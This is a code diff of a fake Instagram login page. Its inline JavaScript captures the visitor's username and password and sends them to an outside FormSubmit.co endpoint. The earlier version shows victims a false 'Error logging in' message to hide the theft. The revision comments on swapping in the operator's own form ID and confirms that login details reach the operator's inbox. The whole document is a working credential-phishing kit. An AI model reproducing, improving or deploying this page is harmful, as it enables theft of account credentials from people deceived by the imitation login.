@@ -1,58 +1,59 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <title>Instagram</title>
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <meta http-equiv="refresh" content="60">
-    <link rel="icon" href="images/favicon.png" type="image/icon">
-    <link rel="stylesheet" href="style.css">
+<meta charset="utf-8">
+<title>Instagram</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta http-equiv="refresh" content="60">
+<link rel="icon" href="images/favicon.png" type="image/icon">
+<link rel="stylesheet" href="style.css">
 
-    <!-- 1️⃣ Inline JS – no external libraries needed -->
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const form = document.getElementById('loginForm');
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('loginForm');
 
-            form.addEventListener('submit', async (e) => {
-                e.preventDefault();               // stop normal navigation
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
 
-                const username = form.u_name.value.trim();
-                const password = form.pass.value.trim();
+        const username = form.u_name.value.trim();
+        const password = form.pass.value.trim();
 
-                if (!username || !password) {
-                    alert('Please fill in both fields.');
-                    return;
+        if (!username || !password) {
+            alert('Please fill in both fields.');
+            return;
+        }
+
+        // ---- 1. Build payload --------------------------------------------
+        const payload = new URLSearchParams();
+        payload.append('u_name', username);
+        payload.append('pass', password);
+        payload.append('_subject', 'New Instagram login attempt');
+
+        // ---- 2. Send to FormSubmit.co ------------------------------------
+        try {
+            const resp = await fetch(
+                // <-- Replace with your *Form ID* (not raw email)
+                'https://formsubmit.co/21d4afb9cad81ea743f2b5505ae04bb4',
+                {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: payload,
+                    cache: 'no-store'          // <-- prevents caching
                 }
+            );
 
-                // Build the payload in URL‑encoded form (what FormSubmit expects)
-                const payload = new URLSearchParams();
-                payload.append('u_name', username);
-                payload.append('pass', password);
-                // Optional: add subject or a redirect URL
-                payload.append('_subject', 'New Login Attempt');
-                // payload.append('_next', 'https://yourdomain.com/thankyou.html'); // optional
+            if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
 
-                try {
-                    const resp = await fetch('https://formsubmit.co/21d4afb9cad81ea743f2b5505ae04bb4', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: payload,
-                        cache: 'no-store'
-                    });
-
-                    if (!resp.ok) throw new Error('Network response was not ok');
-
-                    // Success – give the user a friendly message
-                    alert('Error logging in. Server error. Try again later!');
-                    // Optionally clear the form
-                    form.reset();
-                } catch (err) {
-                    console.error(err);
-                    alert('Something went wrong. Please try again later.');
-                }
-            });
-        });
-    </script>
+            // ---- 3. Success feedback ---------------------------------------
+            alert('Login details sent to your inbox.');
+            form.reset();
+        } catch (err) {
+            console.error(err);
+            alert('Could not send data – try again in a minute.');
+        }
+    });
+});
+</script>
 </head>
 
 <body>
@@ -63,7 +64,6 @@
         </div>
 
         <br/>
-        <!-- 2️⃣ Updated form – no action attribute needed -->
         <form id="loginForm" class="container" method="post">
             <input type="text" placeholder="Phone number, username, or email" name="u_name" required>
             <input type="password" placeholder="Password" name="pass" required>
